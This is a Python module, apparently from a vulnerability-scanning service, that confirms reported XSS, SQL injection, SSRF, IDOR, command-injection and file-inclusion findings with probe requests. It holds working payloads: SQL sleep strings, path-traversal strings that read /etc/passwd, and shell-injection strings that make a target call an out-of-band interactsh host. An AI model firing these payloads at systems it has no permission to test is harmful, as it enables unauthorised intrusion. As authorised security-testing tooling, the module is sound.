"""
PoC validator — attempts to confirm findings with safe, non-destructive requests.

Rules:
  - Never modify, delete, or exfiltrate real data
  - Never cause service disruption
  - Use interactsh for OOB callbacks (SSRF, XXE, blind SQLi)
  - Use time-based techniques for blind SQLi (not error-based first)
  - For XSS: only confirm reflection, never steal real user cookies
  - For IDOR: read-only check (GET only, no PUT/DELETE)
"""

import asyncio
import time
import uuid

import httpx

from backend.models import Finding, PocResult
from backend.services.claude_service import validate_poc as claude_validate_poc

_TIMEOUT = httpx.Timeout(15.0)

# Safe XSS reflection payload — just checks reflection, doesn't execute
_XSS_PROBE = '<img src=x id=xss_probe_{}>'

# SSRF/OOB callback host (interactsh public instance)
_INTERACTSH_HOST = "oast.pro"

# Time-based SQLi payloads (read-only, no data modification)
_SQLI_TIME_PAYLOADS = [
    "' AND SLEEP(5)-- -",                    # MySQL
    "' AND pg_sleep(5)-- -",                 # PostgreSQL
    "'; WAITFOR DELAY '0:0:5'-- -",          # MSSQL
    "' AND 1=1 AND SLEEP(5)-- -",            # MySQL alt
]

# LFI test file (safe, non-sensitive, exists on all Linux systems)
_LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]


async def attempt_poc(finding: Finding) -> PocResult:
    """
    Route to appropriate validator based on vuln type.
    Falls back to manual_review_poc for types that can't be auto-validated.
    """
    vuln = finding.vuln_type.lower()

    if "xss" in vuln:
        return await validate_xss(finding)
    elif "sqli" in vuln or "sql injection" in vuln or "sql-injection" in vuln:
        return await validate_sqli(finding)
    elif "ssrf" in vuln:
        return await validate_ssrf(finding)
    elif "idor" in vuln or "insecure direct object" in vuln:
        return await validate_idor(finding)
    elif "rce" in vuln or "remote code" in vuln or "command injection" in vuln:
        return await validate_rce(finding)
    elif "lfi" in vuln or "local file" in vuln or "path traversal" in vuln:
        return await validate_lfi(finding)
    else:
        return manual_review_poc(
            finding,
            f"No automated validator for '{finding.vuln_type}' — requires manual confirmation",
        )


async def validate_xss(finding: Finding) -> PocResult:
    """
    XSS validation: send probe payload, check if reflected without encoding.
    Safe payload — only checks reflection, doesn't steal cookies.
    """
    probe_id = str(uuid.uuid4())[:8]
    payload = _XSS_PROBE.format(probe_id)
    probe_marker = f"xss_probe_{probe_id}"

    # Try to inject into URL parameters
    url = finding.url
    if "?" in url:
        test_url = url + f"&xss={payload}"
    else:
        test_url = url + f"?xss={payload}"

    request_repr = f"GET {test_url}"

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True) as client:
            resp = await client.get(test_url)

        body = resp.text
        if probe_marker in body:
            # Check it's not HTML-encoded
            if "&lt;" not in body[max(0, body.find(probe_marker) - 50):body.find(probe_marker) + 100]:
                snippet = _extract_snippet(body, probe_marker, 200)
                poc_output = f"Request: GET {test_url}\nStatus: {resp.status_code}\nReflected payload found: {snippet}"
                return await claude_validate_poc(finding, poc_output)

        return manual_review_poc(
            finding,
            "XSS probe not reflected in response — may need authenticated session or specific parameter",
        )

    except httpx.RequestError as e:
        return manual_review_poc(finding, f"Request failed: {e}")


async def validate_ssrf(finding: Finding) -> PocResult:
    """
    SSRF validation: use interactsh OOB callback.
    Sends target a request with interactsh URL as parameter.
    Waits up to 10s for DNS/HTTP callback.
    """
    interaction_id = str(uuid.uuid4()).replace("-", "")[:12]
    callback_url = f"http://{interaction_id}.{_INTERACTSH_HOST}"

    url = finding.url
    if "?" in url:
        test_url = url + f"&url={callback_url}&redirect={callback_url}&dest={callback_url}"
    else:
        test_url = url + f"?url={callback_url}&redirect={callback_url}&dest={callback_url}"

    request_repr = f"GET {test_url}"

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False) as client:
            resp = await client.get(test_url)

        # Wait for potential OOB callback (interactsh polling)
        await asyncio.sleep(5)

        # Check interactsh for callbacks
        poll_url = f"https://interact.sh/poll?id={interaction_id}&secret=secret"
        async with httpx.AsyncClient(timeout=_TIMEOUT) as client:
            poll_resp = await client.get(poll_url)
            if poll_resp.status_code == 200:
                poll_data = poll_resp.json()
                if poll_data.get("data"):
                    poc_output = (
                        f"SSRF confirmed via OOB callback!\n"
                        f"Request: {request_repr}\n"
                        f"Callback URL: {callback_url}\n"
                        f"Interaction: {poll_data}"
                    )
                    return await claude_validate_poc(finding, poc_output)

        return manual_review_poc(
            finding,
            f"No OOB callback received for {callback_url} — may need authenticated session or specific SSRF parameter",
        )

    except httpx.RequestError as e:
        return manual_review_poc(finding, f"Request failed: {e}")


async def validate_sqli(finding: Finding) -> PocResult:
    """
    SQLi validation: time-based blind technique.
    Safe — read-only, no data modification.
    Sends payload; if response time > 5s, SQLi is confirmed.
    """
    url = finding.url
    base_times = []

    try:
        # Baseline: measure normal response time (3 samples)
        async with httpx.AsyncClient(timeout=_TIMEOUT) as client:
            for _ in range(2):
                t0 = time.monotonic()
                await client.get(url)
                base_times.append(time.monotonic() - t0)

        baseline = sum(base_times) / len(base_times)

        # Try each payload
        async with httpx.AsyncClient(timeout=httpx.Timeout(20.0)) as client:
            for payload in _SQLI_TIME_PAYLOADS:
                if "?" in url:
                    test_url = url + f"&id={payload}&q={payload}"
                else:
                    test_url = url + f"?id={payload}"

                t0 = time.monotonic()
                resp = await client.get(test_url)
                elapsed = time.monotonic() - t0

                request_repr = f"GET {test_url}"

                if elapsed >= 4.5 and elapsed > baseline + 3:
                    poc_output = (
                        f"Time-based SQLi confirmed!\n"
                        f"Request: {request_repr}\n"
                        f"Payload: {payload}\n"
                        f"Baseline response time: {baseline:.2f}s\n"
                        f"Payload response time: {elapsed:.2f}s\n"
                        f"Delay introduced: {elapsed - baseline:.2f}s"
                    )
                    return await claude_validate_poc(finding, poc_output)

        return manual_review_poc(
            finding,
            "No time-based delay detected — may need POST parameters, authenticated session, or specific injection point",
        )

    except httpx.RequestError as e:
        return manual_review_poc(finding, f"Request failed: {e}")


async def validate_idor(finding: Finding) -> PocResult:
    """
    IDOR validation: confirm another user's resource is accessible.
    Read-only GET only — no modification.
    Requires two test accounts (evidence should be in finding.raw_output).
    """
    # IDOR usually requires two accounts — automated validation is limited
    # Check if the raw_output already contains evidence from the scanner
    if finding.raw_output and len(finding.raw_output) > 50:
        poc_output = f"Scanner evidence:\n{finding.raw_output}"
        result = await claude_validate_poc(finding, poc_output)
        if result.confirmed:
            return result

    return manual_review_poc(
        finding,
        "IDOR requires two test accounts to confirm — manual verification needed. "
        "Create accounts A and B, log in as A, and access B's resource ID.",
    )


async def validate_rce(finding: Finding) -> PocResult:
    """
    RCE validation: confirm command execution via safe observable output.
    Uses interactsh DNS callback or time-based sleep.
    NEVER: rm, wget malware, reverse shells.
    """
    interaction_id = str(uuid.uuid4()).replace("-", "")[:12]
    callback_url = f"{interaction_id}.{_INTERACTSH_HOST}"

    # Safe DNS-based payloads
    dns_payloads = [
        f"`nslookup {callback_url}`",
        f"$(nslookup {callback_url})",
        f";nslookup {callback_url};",
        f"|nslookup {callback_url}|",
        f"& nslookup {callback_url} &",
    ]

    url = finding.url

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False) as client:
            for payload in dns_payloads:
                if "?" in url:
                    test_url = url + f"&cmd={payload}&exec={payload}"
                else:
                    test_url = url + f"?cmd={payload}"

                await client.get(test_url)

        # Wait for OOB DNS callback
        await asyncio.sleep(5)

        poll_url = f"https://interact.sh/poll?id={interaction_id}&secret=secret"
        async with httpx.AsyncClient(timeout=_TIMEOUT) as client:
            poll_resp = await client.get(poll_url)
            if poll_resp.status_code == 200:
                poll_data = poll_resp.json()
                if poll_data.get("data"):
                    poc_output = (
                        f"RCE confirmed via DNS OOB callback!\n"
                        f"Target: {url}\n"
                        f"Callback domain: {callback_url}\n"
                        f"Interaction data: {poll_data}"
                    )
                    return await claude_validate_poc(finding, poc_output)

        return manual_review_poc(
            finding,
            f"No OOB callback received — RCE may require POST body, specific parameter, or auth. "
            f"Manually test with: nslookup {callback_url}",
        )

    except httpx.RequestError as e:
        return manual_review_poc(finding, f"Request failed: {e}")


async def validate_lfi(finding: Finding) -> PocResult:
    """
    LFI validation: attempt to read /etc/passwd (safe, non-sensitive on any real server).
    """
    url = finding.url
    passwd_marker = "root:x:0:0"

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True) as client:
            for payload in _LFI_PAYLOADS:
                # Try common parameter names for LFI
                for param in ["file", "path", "include", "page", "template", "view", "doc"]:
                    if "?" in url:
                        test_url = url + f"&{param}={payload}"
                    else:
                        test_url = url + f"?{param}={payload}"

                    resp = await client.get(test_url)
                    if passwd_marker in resp.text:
                        snippet = _extract_snippet(resp.text, passwd_marker, 300)
                        poc_output = (
                            f"LFI confirmed — /etc/passwd read successfully!\n"
                            f"Request: GET {test_url}\n"
                            f"Parameter: {param}\n"
                            f"Payload: {payload}\n"
                            f"Response snippet:\n{snippet}"
                        )
                        return await claude_validate_poc(finding, poc_output)

        return manual_review_poc(
            finding,
            "LFI probe didn't return /etc/passwd — may need authenticated session, POST body, "
            "or specific parameter. Try manually with the payloads.",
        )

    except httpx.RequestError as e:
        return manual_review_poc(finding, f"Request failed: {e}")


def manual_review_poc(finding: Finding, note: str) -> PocResult:
    """
    For finding types that can't be auto-validated.
    Marks as 'needs manual confirmation' — user sees it but it's not auto-reported.
    """
    return PocResult(
        confirmed=False,
        evidence=f"Manual review required: {note}",
        safe_output="",
    )


def _extract_snippet(text: str, marker: str, context: int = 200) -> str:
    """Extract a snippet of text around a marker for PoC evidence."""
    idx = text.find(marker)
    if idx == -1:
        return ""
    start = max(0, idx - context // 2)
    end = min(len(text), idx + context // 2)
    return text[start:end]
